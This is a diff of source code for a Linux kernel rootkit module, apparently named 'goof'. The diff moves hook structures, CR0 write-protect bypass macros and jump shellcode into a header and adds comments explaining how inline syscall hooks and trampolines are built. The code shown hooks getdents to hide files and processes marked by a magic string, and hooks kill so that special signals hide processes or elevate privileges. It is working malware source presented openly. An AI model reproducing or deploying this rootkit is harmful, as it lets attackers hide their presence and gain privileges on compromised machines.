@@ -5,125 +5,7 @@ Description: trampolining rootkit. Used to hide files, proccesses, and network c
 Task:
 ## Comms with rootkti ##
 */
-
-#include <linux/sched.h>
-#include <linux/version.h>
-#include <linux/err.h>
-#include <linux/kernel.h>
-#include <linux/module.h>
-#include <linux/init.h>
-#include <linux/types.h>
-#include <linux/dirent.h>
-#include <linux/syscalls.h>
-#include <linux/unistd.h>
-#include <linux/fs.h>
-#include <linux/utsname.h>
-#include <linux/file.h>
-#include <linux/fdtable.h>
-#include <linux/slab.h>
-#include <linux/utsname.h>
-#include <asm/pgtable.h>
-#include <linux/vmalloc.h>
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
-	#include <linux/proc_ns.h>
-#else
-	#include <linux/proc_fs.h>
-#endif
-
-#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
-	#include <asm/uaccess.h>
-#endif
-
-//Allow and disallow writing to syscall
-#define DISABLE_W_PROTECTED_MEMORY \
-	preempt_disable(); \
-	barrier(); \
-	write_cr0(read_cr0() & (~ 0x00010000)); 
-
-#define ENABLE_W_PROTECTED_MEMORY \
-	write_cr0(read_cr0()); \
-	barrier(); \
-	preempt_enable();
-
-
-//## /Credit ##
-//Declare macros - Should be in header
-//#define KILL_SIG 61
-#define HIDE_SIG 62
-#define HIDDEN 0x10000000
-#define ESC_SIG 63
-
-//Declare vars
-static unsigned long *__sys_call_table;
-int is_hidden_proc(pid_t pid);
-unsigned char * create_tramp(unsigned long *dst, unsigned long *src, unsigned int id, unsigned int h_len);
-
-int HOOK_LEN = 15;
-
-//Code used to jump to arbitrary addresses
-//movabs rax,0x1122334455667788
-//mov    rax,rax
-//jmp    rax
-unsigned char JUMP_TEMPLATE[] = "\x48\xb8\x88\x77\x66\x55\x44\x33\x22\x11\x48\x89\xc0\xff\xe0";
- 
-
- 
-//Struct for each hook
-struct Hook{
-	unsigned int id;
-	unsigned int hook_len;
-	//Backup of old code so we can restore it
-	unsigned char *original_code;
-	//Hook to be inserted into syscall function
-	unsigned char *hook;
-	//Trampoline that goofy function will call at end
-	unsigned char *trampoline;
-	//Pointer to the original function
-	unsigned char *og_func;
-	//Pointer to the new function?
-	unsigned char *new_func;
-	//Paused or not
-	unsigned char paused;
-};
-
-//Struct used by the uname syscall
-struct utsname {
-	char sysname[sizeof(utsname()->sysname)];    /* Operating system name (e.g., "Linux") */
-	char nodename[sizeof(utsname()->nodename)];   /* Name within "some implementation-defined network" */
-	char release[sizeof(utsname()->release)];    /* Operating system release (e.g., "2.6.28") */
-	char version[sizeof(utsname()->version)];    /* Operating system version */
-	char machine[sizeof(utsname()->machine)];    /* Hardware identifier */
-#ifdef _GNU_SOURCE
-	char domainname[]; /* NIS or YP domain name */
-#endif
-};
-
-struct linux_dirent {
-	unsigned long  d_ino;     /* Inode number */
-	unsigned long  d_off;     /* Offset to next linux_dirent */
-	unsigned short d_reclen;  /* Length of this linux_dirent */
-	char           d_name[];  /* Filename (null-terminated) */
-	/* length is actually (d_reclen - 2 -
-	    offsetof(struct linux_dirent, d_name) */
-	 /*
-		char           pad;       // Zero padding byte
-		char           d_type;    // File type (only since Linux 2.6.4;
-		                          // offset is (d_reclen - 1))
-								  */
-};
-
-typedef int pid_t;
-
-unsigned char *jump;
-struct Hook **hooks;
-
-
-int (*original_kill)(pid_t, int);
-int (*original_getdents)(unsigned int, struct  linux_dirent *, unsigned int);
-int (*original_getdents64)(unsigned int, struct linux_dirent *, unsigned int);
-int (*original_open)(const char *, int, mode_t);
-int (*original_uname)(struct utsname *);
+#include "goof.h"
 
 // Iterate over the entire possible range until you find some __NR_close
 /* Find the syscall table.
@@ -202,7 +84,7 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 		ptr = ptr + i;
 		cur_dire = (struct linux_dirent *)ptr;
 		//Check if the cur_dire name contains magic string
-		if(strstr(cur_dire->d_name, "E1e37") != NULL){
+		if(strstr(cur_dire->d_name, MAGIC_STRING) != NULL){
 			//DEBUG if does print to buffer
 		}else if(proc && is_hidden_proc(simple_strtoul(cur_dire->d_name, NULL, 10))){
 			//Else if process to hide, hide /proc/pid
@@ -221,9 +103,8 @@ int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int cou
 	return ret;	
 }
 
-
-//### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
-//More efficent than using an expanding array of PIDs
+/// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
+/// More efficent than using an expanding array of PIDs
 struct task_struct *find_task(pid_t pid){
 	struct task_struct *tmp = current;
 	//Iterate through each process to find the desired process
@@ -234,7 +115,7 @@ struct task_struct *find_task(pid_t pid){
 	}
 	return NULL;
 }
-//Check if process is hidden👀
+/// Check if process is hidden👀
 int is_hidden_proc(pid_t pid){
 	//If pid DNE return
 	if(pid == 0){ return 0; }
@@ -252,6 +133,12 @@ int is_hidden_proc(pid_t pid){
 
 //### END CREDIT ###
 
+/// @param pid the process ID of the process where the signal
+///		is being sent
+/// @param sig the signal being sent to the process. If this
+///		signal is one of our defined ones goofy_kill prevents
+///		the process from being killed and will hide or elevate
+///		prems.
 int goofy_kill(pid_t pid, int sig){
 	//printk("[goof] goofy_kill\n");
 	/*FAULT - invalid opcode - Relative jump is wreking everything :(
@@ -271,8 +158,27 @@ int goofy_kill(pid_t pid, int sig){
 	return ret;
 }
 
-/// @param src where original source code is coming from
-/// 	and where the new code is going
+/* @brief create and insert inline hook, create trampoline
+ * 
+ * It's a beast... I'll try to include a diagram.
+ * 
+ * 1. Save the first <h_len> bytes from the original syscall to our struct
+ * 2. Create an inline hook by setting jump to all \x90 then copying the JUMP_TEMPLATE over the bytes
+ * 3. Copy the destination address into the jump (over the \x11\x22\x33\x44\x55\x66\x77\x88 value)
+ * 4. Build the trampoline.
+ *		-Copy jump template to end of original code copy from step 1
+ *		-Copy the address of the syscall (just after where we copied in step 1, syscall+h_len+1) over the place holder \x11\x22\x33\x44\x55\x66\x77\x88 
+ * 5. Write the hook created in steps 2 & 3 over the first h_len bytes in the system call
+ *		-Requires disabling write protect
+ *		-Renable afterwards so things don't break unexpectedly
+ *
+ * @param src where original source code is coming from
+ *   	and where the new code is going
+ * @param new_func the goofy function that is hooking
+ *		the original function
+ *	@param id numeric identifier that will define tho hook
+ *		struct in an array of hook structs
+*/
 unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigned int id, unsigned int h_len){
 	printk("[goof] hooking %p with %p\n", src, new_func);
 	unsigned char *tmp = (unsigned char *)src;
@@ -351,7 +257,10 @@ unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigne
 	return NULL;
 }
 
-
+/* @brief remove a trampoline based on its ID
+ *
+ * @param id numeric identifier of the hook to be removed
+*/
 void remove_tramp(unsigned int id ){
 	//Write old code back to the original syscall
 	DISABLE_W_PROTECTED_MEMORY
@@ -359,7 +268,8 @@ void remove_tramp(unsigned int id ){
 	ENABLE_W_PROTECTED_MEMORY
 }
 
-int hooks_count = 3;
+//Defines the maximum number of hooks to be stored in the array
+#define HOOKS_COUNT 3
 
 static int __init
 goof_init(void) {
@@ -369,7 +279,7 @@ goof_init(void) {
 
 	printk("[goof] module loaded\n");
 
-	hooks = kmalloc(sizeof(struct Hook *)*hooks_count, GFP_KERNEL);
+	hooks = kmalloc(sizeof(struct Hook *)*HOOKS_COUNT, GFP_KERNEL);
 
 	//Find base syscall address	
 	__sys_call_table = find(); 
